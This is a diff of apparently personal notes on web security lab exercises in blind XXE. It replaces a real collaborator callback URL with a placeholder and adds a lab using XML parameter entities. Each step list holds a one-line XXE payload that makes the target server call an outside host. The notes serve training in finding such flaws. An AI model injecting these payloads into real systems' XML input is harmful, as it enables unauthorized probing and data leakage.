@@ -18,8 +18,17 @@
 
      1. Check stock and send the request to repeater.
      2. Go to collaborator and copy the payload URL.
-     3. Add <!DOCTYPE test [<!ENTITY xxe SYSTEM "http://3swgluxzdiw0eeskwuu03raj0a61urig.oastify.com">]> after xml line
+     3. Add <!DOCTYPE test [<!ENTITY xxe SYSTEM "http://collaboratorurl">]> after xml line
      4. Replace the value of productID with &xxe; and send the request.
      5. Check collaborator for the interaction.
+
+---------------------------------------------------------------------------------------------------
+
+#4 Lab: Blind XXE with out-of-band interaction via XML parameter entities
+
+      1. Check stock and send the request to repeater.
+      2. Go to collaborator and copy the payload URL.
+      3. Add <!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://collaboratorurl"> %xxe;]> after xml line
+      4. Check collaborator for the interaction.
 
 ---------------------------------------------------------------------------------------------------
